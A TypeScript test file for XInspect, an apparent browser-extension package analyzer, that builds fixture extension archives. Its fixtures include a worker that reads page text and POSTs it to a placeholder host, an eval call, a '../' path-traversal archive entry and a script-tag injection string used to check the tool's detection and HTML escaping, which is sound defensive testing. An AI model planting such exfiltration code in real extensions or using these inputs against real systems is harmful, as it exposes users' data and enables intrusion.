import assert from 'node:assert/strict';
import { mkdtemp, readFile, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { test } from 'node:test';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import JSZip from 'jszip';
import { analyzePackage } from '../src/analyze.js';
import { renderHtml } from '../src/report.js';

async function packageFile(files: Record<string, string>, extension = '.xpi'): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), 'xinspect-test-'));
  const zip = new JSZip();
  for (const [path, contents] of Object.entries(files)) zip.file(path, contents);
  const path = join(dir, `fixture${extension}`);
  await writeFile(path, await zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' }));
  return path;
}

const manifest3 = (extra: object = {}) => JSON.stringify({ manifest_version: 3, name: 'Fixture', version: '1.0', ...extra }, null, 2);

test('MV3 package reports manifest, file evidence, combined priority, and SHA-256', async () => {
  const path = await packageFile({
    'manifest.json': manifest3({ host_permissions: ['<all_urls>'], permissions: ['cookies'], background: { service_worker: 'worker.js' } }),
    'worker.js': "const data = document.body.innerText;\nfetch('https://example.org/collect', {method: 'POST', body: data});\n"
  });
  const report = await analyzePackage(path);
  assert.equal(report.manifest.manifestVersion, 3);
  assert.deepEqual(report.manifest.backgroundScripts, ['worker.js']);
  assert.match(report.package.sha256, /^[0-9a-f]{64}$/);
  assert.equal(report.findings.find(x => x.id === 'broad-page-network')?.severity, 'high');
  assert.equal(report.findings.find(x => x.id === 'sensitive-api-network')?.severity, 'high');
  assert.ok(report.findings.some(x => x.evidence.some(e => e.file === 'worker.js' && e.line === 2)));
  assert.equal(report.inventory.find(x => x.path === 'worker.js')?.scanned, true);
});

test('MV2 content scripts, background page, and inline HTML are scanned with source locations', async () => {
  const path = await packageFile({
    'manifest.json': JSON.stringify({ manifest_version: 2, name: 'Fixture', version: '1.0', permissions: ['tabs'], background: { page: 'background.html' }, content_scripts: [{ matches: ['https://example.org/*'], js: ['content.js'] }], browser_action: { default_popup: 'popup.html' } }),
    'content.js': 'document.body.textContent = "hello";',
    'background.html': '<html><script src="content.js"></script></html>',
    'popup.html': '<html>\n<script>\neval("2+2");\n</script>\n<a href="https://example.org">link</a>\n</html>'
  }, '.zip');
  const report = await analyzePackage(path);
  assert.deepEqual(report.manifest.contentScripts, ['content.js']);
  assert.deepEqual(report.manifest.pages, ['background.html', 'popup.html']);
  assert.ok(report.findings.some(x => x.id === 'dynamic-code' && x.evidence.some(e => e.file === 'popup.html' && e.line === 3)));
  assert.ok(report.findings.some(x => x.id === 'dom-write'));
  assert.ok(report.findings.some(x => x.id === 'external-url'));
});

test('parse failures and missing referenced files are recorded as limitations', async () => {
  const path = await packageFile({ 'manifest.json': manifest3({ background: { service_worker: 'missing.js' } }), 'broken.js': 'function {' });
  const report = await analyzePackage(path);
  assert.equal(report.inventory.find(x => x.path === 'broken.js')?.scanned, false);
  assert.ok(report.limitations.some(x => x.includes('Could not scan broken.js')));
  assert.ok(report.limitations.some(x => x.includes('missing.js')));
});

test('invalid archives, missing manifests, and unsafe paths fail', async () => {
  const dir = await mkdtemp(join(tmpdir(), 'xinspect-test-'));
  const invalid = join(dir, 'invalid.xpi');
  await writeFile(invalid, 'not a zip');
  await assert.rejects(analyzePackage(invalid), /Invalid ZIP/);
  await assert.rejects(analyzePackage(await packageFile({ 'script.js': 'hello' })), /manifest.json is missing/);
  await assert.rejects(analyzePackage(await packageFile({ 'manifest.json': manifest3(), '../evil.js': 'hello' })), /Unsafe archive path/);
});

test('oversized entries fail before decompression and HTML escapes source text', async () => {
  await assert.rejects(analyzePackage(await packageFile({ 'manifest.json': manifest3(), 'large.js': 'x'.repeat(5 * 1024 * 1024 + 1) })), /exceeds 5 MiB/);
  const path = await packageFile({ 'manifest.json': manifest3({ name: '<script>alert(1)</script>' }), 'code.js': "fetch('https://example.org/?x=<img>')" });
  const report = await analyzePackage(path);
  const html = renderHtml(report);
  assert.ok(html.includes('&lt;script&gt;alert(1)&lt;/script&gt;'));
  assert.ok(!html.includes('<script>alert(1)</script>'));
  assert.ok(html.includes('&lt;img&gt;'));
});

test('CLI writes both report formats', async () => {
  const path = await packageFile({ 'manifest.json': manifest3(), 'content.js': 'document.body.textContent = "ok";' });
  const output = join(await mkdtemp(join(tmpdir(), 'xinspect-output-')), 'reports');
  await promisify(execFile)(process.execPath, [join(process.cwd(), 'dist/src/cli.js'), 'analyze', path, '--out', output]);
  const json = JSON.parse(await readFile(join(output, 'report.json'), 'utf8'));
  const html = await readFile(join(output, 'report.html'), 'utf8');
  assert.equal(json.schemaVersion, 1);
  assert.ok(html.includes('XInspect · Source review'));
  assert.ok(html.includes('Files in package'));
  assert.ok(json.findings.some((x: { id: string }) => x.id === 'dom-write'));
});

test('localized names, page query strings, and bundled top-level return are handled', async () => {
  const path = await packageFile({
    'manifest.json': manifest3({ name: '__MSG_extName__', default_locale: 'en', sidebar_action: { default_panel: 'panel.html?view=sidebar' } }),
    '_locales/en/messages.json': JSON.stringify({ extName: { message: 'Localized Fixture' } }),
    'panel.html': '<html></html>',
    'vendor.js': "return fetch('https://example.org/data');"
  });
  const report = await analyzePackage(path);
  assert.equal(report.manifest.name, 'Localized Fixture');
  assert.deepEqual(report.manifest.pages, ['panel.html?view=sidebar']);
  assert.ok(report.findings.some(x => x.id === 'network'));
  assert.ok(!report.limitations.some(x => x.includes('panel.html') || x.includes('vendor.js')));
});

test('combined findings retain evidence for every contributing signal', async () => {
  const reads = Array.from({ length: 35 }, () => 'document.body.innerText;').join('\n');
  const path = await packageFile({
    'manifest.json': manifest3({ host_permissions: ['<all_urls>'] }),
    'content.js': `${reads}\nfetch('https://example.org/data');`
  });
  const report = await analyzePackage(path);
  const combined = report.findings.find(x => x.id === 'broad-page-network');
  assert.ok(combined);
  assert.ok(combined.evidence.some(x => x.detail.includes('Broad host access')));
  assert.ok(combined.evidence.some(x => x.detail.includes('reads page content')));
  assert.ok(combined.evidence.some(x => x.detail.includes('fetch request')));
});
